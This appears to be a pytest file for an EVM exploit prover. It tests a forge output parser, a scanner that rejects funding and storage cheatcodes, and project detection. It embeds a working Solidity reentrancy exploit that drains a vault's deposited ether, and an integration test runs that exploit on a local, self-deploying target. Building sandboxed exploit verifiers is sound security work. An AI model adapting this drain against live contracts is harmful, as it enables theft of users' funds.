"""The EVM prover: offline unit tests for the parser, the soundness scanner, detection, and
the doctor; plus a forge-gated integration test that proves a real reentrancy drain on a
local EVM (no archive RPC needed, since the target deploys itself).
"""
from __future__ import annotations

import shutil
from pathlib import Path

import pytest

from sabba.provers.evm import (Foundry, evm_doctor, forbidden_cheatcodes,
                               is_foundry_project, parse_forge_json)
from sabba.provers.evm.foundry import _TOOLS  # noqa: F401  (kept for clarity)
from sabba.types import ExecResult

ROOT = Path(__file__).resolve().parents[1]

_PASS = ('{"test/Exploit.t.sol:Exploit":{"test_results":{"test_exploit()":'
         '{"status":"Success","reason":null,"decoded_logs":["drained 5 ether"]}}}}')
_FAIL = ('{"test/Exploit.t.sol:Exploit":{"test_results":{"test_exploit()":'
         '{"status":"Failure","reason":"no attacker profit"}}}}')
_OTHER = ('{"test/Exploit.t.sol:Exploit":{"test_results":{"test_other()":'
          '{"status":"Success"}}}}')
_BUILD_ERR = "Error: Compiler run failed:\n  ParserError: expected ';'"


def _res(stdout="", stderr="", timed_out=False):
    return ExecResult(exit_code=0, stdout=stdout, stderr=stderr, timed_out=timed_out)


# -- the parser only calls a proof a proof ---------------------------------

def test_parse_pass():
    v = parse_forge_json(_res(stdout=_PASS))
    assert v.verified and v.reason == "exploit_confirmed"


def test_parse_fail_is_not_a_proof():
    v = parse_forge_json(_res(stdout=_FAIL))
    assert not v.verified and v.reason == "no_profit"


def test_parse_other_test_does_not_count():
    # a passing but differently-named test must not read as the exploit proof
    v = parse_forge_json(_res(stdout=_OTHER))
    assert not v.verified and v.reason == "test_absent"


def test_parse_build_error():
    v = parse_forge_json(_res(stdout=_BUILD_ERR, stderr=_BUILD_ERR))
    assert not v.verified and v.reason == "forge_error"


def test_parse_timeout():
    v = parse_forge_json(_res(stdout="", timed_out=True))
    assert not v.verified and v.reason == "timeout_unconfirmed"


# -- the soundness scanner -------------------------------------------------

def test_deal_in_attack_is_rejected():
    src = ("contract Exploit is ProfitCheck {"
           " function setUpTarget() internal override {}"
           " function attack() internal override { vm.deal(address(this), 100 ether); } }")
    assert "vm.deal" in forbidden_cheatcodes(src)


def test_deal_in_setup_is_allowed():
    src = ("contract Exploit is ProfitCheck {"
           " function setUpTarget() internal override { vm.deal(victim, 5 ether); }"
           " function attack() internal override { target.withdraw(); } }")
    assert forbidden_cheatcodes(src) == []


def test_deal_in_setup_rejected_on_a_fork():
    # a live fork has real funds, so funding cheatcodes are unsound even in setUp
    src = ("contract Exploit is ProfitCheck {"
           " function setUpTarget() internal override { vm.deal(victim, 5 ether); }"
           " function attack() internal override { target.withdraw(); } }")
    assert forbidden_cheatcodes(src, allow_setup_funding=False) != []
    assert forbidden_cheatcodes(src, allow_setup_funding=True) == []


def test_store_is_rejected_anywhere():
    src = ("contract Exploit is ProfitCheck {"
           " function setUpTarget() internal override { vm.store(a, b, c); }"
           " function attack() internal override {} }")
    assert "vm.store" in forbidden_cheatcodes(src)


# -- detection and doctor never raise --------------------------------------

def test_is_foundry_project(tmp_path):
    assert not is_foundry_project(tmp_path)
    (tmp_path / "foundry.toml").write_text("[profile.default]\n")
    assert is_foundry_project(tmp_path)


def test_doctor_returns_dict_without_forge():
    d = evm_doctor()
    assert set(d) == {"forge", "anvil", "cast"}


# -- the real thing, when Foundry is present -------------------------------

_EXPLOIT = """// SPDX-License-Identifier: Apache-2.0
pragma solidity >=0.8.0;

import {ProfitCheck} from "./ProfitCheck.sol";
import {Vault} from "../src/Vulnerable.sol";

interface IVm { function deal(address who, uint256 amount) external; }

contract Victim {
    Vault public vault;
    constructor(Vault v) { vault = v; }
    function stash() external { vault.deposit{value: address(this).balance}(); }
    receive() external payable {}
}

contract Exploit is ProfitCheck {
    IVm internal constant vm = IVm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Vault internal vault;

    function setUpTarget() internal override {
        vault = new Vault();
        Victim v = new Victim(vault);
        vm.deal(address(v), 5 ether);
        v.stash();
        vm.deal(address(this), 1 ether);
    }

    function attack() internal override {
        vault.deposit{value: 1 ether}();
        vault.withdraw();
    }

    receive() external payable override {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }
}
"""


@pytest.mark.skipif(shutil.which("forge") is None, reason="Foundry not installed")
def test_reentrancy_drain_is_proven_locally():
    from sabba.provers.evm import EvmExploit, EvmForkProver
    target = ROOT / "targets" / "evm_reentrancy"
    # the exploit is sound by our own scanner before we even run it
    assert forbidden_cheatcodes(_EXPLOIT) == []
    verdict = EvmForkProver().prove(target, EvmExploit(contract="Exploit", solidity=_EXPLOIT))
    assert verdict.verified, f"expected a proven drain: {verdict.reason}\n{verdict.evidence}"
    assert verdict.reason == "exploit_confirmed"


@pytest.mark.skipif(shutil.which("forge") is None, reason="Foundry not installed")
def test_forge_version_runs():
    assert Foundry().available()
    assert "forge" in Foundry().version().lower() or Foundry().version() != ""
